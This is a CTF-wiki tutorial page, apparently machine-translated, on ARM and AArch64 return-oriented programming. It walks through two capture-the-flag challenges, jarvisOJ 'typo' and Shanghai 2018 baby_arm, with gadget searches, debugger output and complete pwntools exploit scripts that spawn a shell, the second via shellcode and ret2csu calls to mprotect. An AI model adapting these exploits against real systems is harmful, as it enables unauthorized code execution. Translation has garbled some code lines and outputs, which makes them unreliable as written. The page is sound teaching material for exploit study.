[EN](./arm_rop.md) | [ZH](./arm_rop-zh.md)
# arm - ROP


## Introduction
Because the pwn of architectures such as arm and mips is still a simple stack vulnerability, so I only intend to introduce the rop under arm. The use of other vulnerabilities will be introduced gradually.


## Prerequisite knowledge
First look at the function calling convention under arm. The first to fourth parameters of the function are stored in the **r0 to r3** registers, and the remaining parameters are pushed into the stack from right to left. The caller implements stack balancing. The return value of the function is stored in **r0**


![](https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png)



In addition, arm **b/bl** and other instructions implement jumps; **pc** register is equivalent to x86 eip, save the address of the next instruction, is also the target we want to control


## jarvisoj - typo

Here is an example of jarvisoj&#39;s typo, which can be downloaded at [ctf-challenge] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo)


### Determining protection
```bash

jarvisOJ_typo [master●●] check ./typo

typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped

[*] &#39;/ home / m4x / pwn_repo / jarvisOJ_typo / typo&#39;
    Arch:     arm-32-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

FOOT: No FOOT (0x8000)
```

Statically linked programs, no open stack overflow protection and PIE; static link instructions, we can find dangerous functions such as **system** and **&quot;/bin/sh&quot;** sensitive strings in binary, because it is No PIE, so we only need stack overflow to construct ropchain to get shell


### Using ideas
So we need to find an overflow point, run the program first, because it is statically linked, so you can run it directly when the environment is configured well.
```bash

jarvisOJ_typo [master ●●] ./typo
Let's Do Some Typing Exercise~

Press Enter to get start;

Input ~ if you want to quit



------Begin------

throng

throng



survive

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
qemu: uncaught target signal 11 (Segmentation fault) - core dumped

[1]    1172 segmentation fault  ./typo

```



There are not many input points in the program, it is easy to find the overflow point.


### Constructing ROP
So the idea is very obvious, using the stack overflow construct **system(&quot;/bin/sh&quot;)**, first find the gadgets
```bash

jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop"   

Gadgets information

============================================================

0x00020904 : pop {r0, r4, pc}

0x00068bec : pop {r1, pc}

0x00008160 : pop {r3, pc}

0x0000ab0c : pop {r3, r4, r5, pc}

0x0000a958 : pop {r3, r4, r5, r6, r7, pc}

0x00014a70 : pop {r3, r4, r7, pc}

0x000083b0 : pop {r4, pc}

0x00009284 : pop {r4, r5, pc}

0x000095b8 : pop {r4, r5, r6, pc}

0x000082e8 : pop {r4, r5, r6, r7, pc}

0x00023ed4 : pop {r4, r5, r7, pc}

0x00023dbc : pop {r4, r7, pc}

0x00014068 : pop {r7, pc}



Unique gadgets found: 13

```



We only need to control the first parameter, so we can choose `pop {r0, r4, pc}` this gadgets to construct the following stack structure.
```

+-------------+

|             |

|  padding    |

+-------------+

|  padding    | <- frame pointer

+-------------+ 

|gadgets_addr | <- return address

+-------------+

|binsh_addr   |

+-------------+

|junk_data    |

+-------------+

|system_addr  |

+-------------+

```



At this time, you need the length of padding and the address of system and /bin/sh. The address of /bin/sh can be found with ROPgadget.
```bash

jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh

Strings information

============================================================

0x0006cb70 : /bin/sh

```

The length of padding can be easily found using pwntools&#39; **cyclic**
```assembly

pwndbg> cyclic 200

aaaabaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababa
pwndbg> c

Continuing.



Program received signal SIGSEGV, Segmentation fault.

0x62616164 in ?? ()

LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA

──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────

 R0   0x0

 R1   0xfffef024 ◂— 0x61616161 ('aaaa')

 R2   0x7e

 R3   0x0

R4 0x62616162 (&#39;baab&#39;)
 R5   0x0

 R6   0x0

 R7   0x0

 R8   0x0

 R9   0xa5ec ◂— push   {r3, r4, r5, r6, r7, r8, sb, lr}

 R10  0xa68c ◂— push   {r3, r4, r5, lr}

R11 0x62616163 (&#39;resist&#39;)
 R12  0x0

 SP   0xfffef098 ◂— 0x62616165 ('eaab')

 PC   0x62616164 ('daab')

────────────────────────────────────────────────── ─ [DISASM] ─────────────────────────────────────────────────── ──────
Invalid address 0x62616164




















────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────

00:0000│ sp  0xfffef098 ◂— 0x62616165 ('eaab')

01: 0004│ 0xfffef09c ◂- 0x62616166 (&#39;faab&#39;)
02: 0008│ 0xfffef0a0 ◂- 0x62616167 (&#39;gaab&#39;)
03: 000c│ 0xfffef0a4 ◂— 0x62616168 (&#39;haab&#39;)
04:0010│     0xfffef0a8 ◂— 0x62616169 ('iaab')

05: 0014│ 0xfffef0ac ◂- 0x6261616a (&#39;jaab&#39;)
06:0018│     0xfffef0b0 ◂— 0x6261616b ('kaab')

07: 001c│ 0xfffef0b4 ◂- 0x6261616c (&#39;boom&#39;)
Program received signal SIGSEGV

pwndbg> cyclic -l 0x62616164

112

```

So the padding length is 112
&gt; Or you can blast the stack overflow directly more violently


As for the address of system, because the binary is removed from the symbol table, we can first use `rizzo` to restore part of the symbol table (for the recovery symbol table, you can see the reference link first, and will introduce it later). Although rizzo does not work well on this binary, it is fortunate that there are just a few systems in the identified functions.
```C

char *__fastcall system(int a1)

{

  char *result; // r0



  if ( a1 )

    result = sub_10BA8(a1);

  else

    result = (char *)(sub_10BA8((int)"exit 0") == 0);

  return result;

}

```

&gt; Or you can find the system function by searching for the /bin/sh string
## exp

All the conditions are there, construct system(&quot;/bin/sh&quot;)
```

jarvisOJ_typo [master●●] cat solve.py 

#!/usr/bin/env python

# -*- coding: utf-8 -*-



from pwn import *

import sys

import pdb

#  context.log_level = "debug"



#  for i in range(100, 150)[::-1]:

for i in range(112, 123):

    if sys.argv[1] == "l":

io = process (&quot;./ typo&quot;, timeout = 2)
elif sys.argv [1] == &quot;d&quot;:
        io = process(["qemu-arm", "-g", "1234", "./typo"])

    else:

        io = remote("pwn2.jarvisoj.com", 9888, timeout = 2)

    

    io.sendafter("quit\n", "\n")

io.recvline ()
    

    '''

    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh

    Strings information

    ============================================================

    0x0006c384 : /bin/sh

    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop|ret" | grep r0

    0x00020904 : pop {r0, r4, pc}

    '''

    

    payload = 'a' * i + p32(0x20904) + p32(0x6c384) * 2 + p32(0x110B4)

    success(i)

    io.sendlineafter("\n", payload)



    #  pause()

    try:

        #  pdb.set_trace()

io.sendline (&quot;echo aaaa&quot;)
io.recvuntil (&quot;aaaa&quot;, timeout = 1)
    except EOFError:

io.close ()
        continue

    else:

io.interactive ()
```



## 2018 Shanghai University Student Network Security Competition - baby_arm


### Static analysis


The title gave a `aarch64` schema file without open canary protection
```bash

Shanghai2018_baby_arm [master] check ./pwn

+ file ./pwn
./pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped

+ checksec ./pwn

[*] '/home/m4x/pwn_repo/Shanghai2018_baby_arm/pwn'

    Arch:     aarch64-64-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x400000)

```

Look at the program logic
```C

__int64 main_logic()

{

  Init();

  write(1LL, "Name:", 5LL);

  read(0LL, input, 512LL);

  sub_4007F0();

  return 0LL;

}



void sub_4007F0()

{

  __int64 v0; // [xsp+10h] [xbp+10h]



  read(0LL, &v0, 512LL);

}

```

The trunk of the program reads 512 characters to a global variable, and in `sub_4007F0()`, it reads 512 bytes onto the stack. Note that this starts directly from `frame pointer + 0x10` Read, so it doesn&#39;t matter if you turn on canary protection.


### Ideas
Take a look at the idea, you can directly rop, but we do not know the remote libc version, but also found that the program has a code segment called `mprotect`
```assembly

.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
.text:00000000004007CC                 MOV             X29, SP

.text:00000000004007D0                 MOV             W2, #0

.text:00000000004007D4                 MOV             X1, #0x1000

.text:00000000004007D8                 MOV             X0, #0x1000

.text:00000000004007DC                 MOVK            X0, #0x41,LSL#16

.text:00000000004007E0                 BL              .mprotect

.text:00000000004007E4                 NOP

.text:00000000004007E8                 LDP             X29, X30, [SP],#0x10

.text: 00000000004007EC RET
```

But this code sets the permission bit of `mprotect` to 0, there is no executable permission, which requires us to control the permissions such as bss section by rop control `mprotect` to be writable executable.


So you can have the following ideas:


1. When you type name for the first time, write shellcode in the bss section.
2. Call mprotect via rop to change the permissions of bss
3. Return to the shellcode on bss


`mprotect` needs to control three parameters, you can consider using [ret2csu](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu) This method can be found as follows Gadgets to control the `x0, x1, x2` registers
```assembly

.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]

.text:00000000004008B0                 MOV             X2, X22

.text:00000000004008B4                 MOV             X1, X23

.text:00000000004008B8                 MOV             W0, W24

.text:00000000004008BC                 ADD             X19, X19, #1

.text:00000000004008C0                 BLR             X3

.text:00000000004008C4                 CMP             X19, X20

.text:00000000004008C8                 B.NE            loc_4008AC

.text:00000000004008CC

.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j

.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]

.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]

.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]

.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40

.text: 00000000004008DC RET
```



The final [exp](https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py) is as follows:
```python

#!/usr/bin/env python

# -*- coding: utf-8 -*-



from pwn import *

import sys

context.binary = "./pwn"

context.log_level = "debug"



if sys.argv[1] == "l":

io = process ([ &quot;QEMU-aarch64&quot;, &quot;-The&quot;, &quot;/ usr / aarch64-linux-gnu&quot;, &quot;./pwn&quot;])
elif sys.argv [1] == &quot;d&quot;:
io = process ([ &quot;QEMU-aarch64&quot;, &quot;G&quot;, &quot;1234&quot;, &quot;-The&quot;, &quot;/ usr / aarch64-linux-gnu&quot;, &quot;./pwn&quot;])
else:

io = remote (&quot;106.75.126.171&quot;, 33865)


def csu_rop(call, x0, x1, x2):

    payload = flat(0x4008CC, '00000000', 0x4008ac, 0, 1, call)

    payload += flat(x2, x1, x0)

    payload += '22222222'

    return payload





if __name__ == "__main__":

    elf = ELF("./pwn", checksec = False)

    padding = asm('mov x0, x0')



    sc = asm(shellcraft.execve("/bin/sh"))

    #  print disasm(padding * 0x10 + sc)

    io.sendafter("Name:", padding * 0x10 + sc)

    sleep(0.01)



    #  io.send(cyclic(length = 500, n = 8))

    #  rop = flat()

    payload = flat(cyclic(72), csu_rop(elf.got['read'], 0, elf.got['__gmon_start__'], 8))

    payload += flat(0x400824)

    io.send(payload)

    sleep(0.01)

    io.send(flat(elf.plt['mprotect']))

    sleep(0.01)



    raw_input("DEBUG: ")

    io.sendafter("Name:", padding * 0x10 + sc)

    sleep(0.01)



    payload = flat(cyclic(72), csu_rop(elf.got['__gmon_start__'], 0x411000, 0x1000, 7))

    payload += flat(0x411068)

    sleep(0.01)

    io.send(payload)



io.interactive ()
```



### notice

At the same time, it should be noted that the result of the `checksec` detection is that nx protection is turned on, but the result of this detection is not necessarily accurate, because the nx protection of the program can also be determined by the parameter `-nx` when qemu is started (such as this The problem can be nx protected by the error detection program when the remote fails. The old version of qemu may not have this parameter.
```bash

Desktop ./qemu-aarch64 --version

qemu-aarch64 version 2.7.0, Copyright (c) 2003-2016 Fabrice Bellard and the QEMU Project developers

Desktop ./qemu-aarch64 -h| grep nx

-nx           QEMU_NX           enable NX implementation

```



If there is an error below, there is no assembler for aarch64
```bash

[ERROR] Could not find 'as' installed for ContextType(arch = 'aarch64', binary = ELF('/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn'), bits = 64, endian = 'little', log_level = 10)

    Try installing binutils for this architecture:

    https://docs.pwntools.com/en/stable/install/binutils.html

```

Can refer to the official documentation solution
```bash

Shanghai2018_baby_arm [master●] apt search binutils| grep aarch64

p   binutils-aarch64-linux-gnu                                         - GNU binary utilities, for aarch64-linux-gnu target

p   binutils-aarch64-linux-gnu:i386                                    - GNU binary utilities, for aarch64-linux-gnu target

p   binutils-aarch64-linux-gnu-dbg                                     - GNU binary utilities, for aarch64-linux-gnu target (debug symbols)

p   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, for aarch64-linux-gnu target (debug symbols)

Shanghai2018_baby_arm [master●] sudo apt install bintuils-aarch64-linux-gnu

```

&gt; aarch64 files are `arm64` when libc is installed and `aarch64` when `binutils` is installed.


## Example
Codegate2015 - looked


## references


http://www.freebuf.com/articles/terminal/134980.html
